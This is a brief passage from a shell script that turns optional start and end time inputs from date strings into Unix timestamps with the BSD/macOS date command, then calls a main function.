if [ -n "$INPUT_START_TIME" ]; then
    INPUT_START_TIME=$(date -j -f "%Y-%m-%d %H:%M:%S" "$INPUT_START_TIME" "+%s")
fi
if [ -n "$INPUT_END_TIME" ]; then
    INPUT_END_TIME=$(date -j -f "%Y-%m-%d %H:%M:%S" "$INPUT_END_TIME" "+%s")
fi

# Execute main only if validation passes
main "$@" 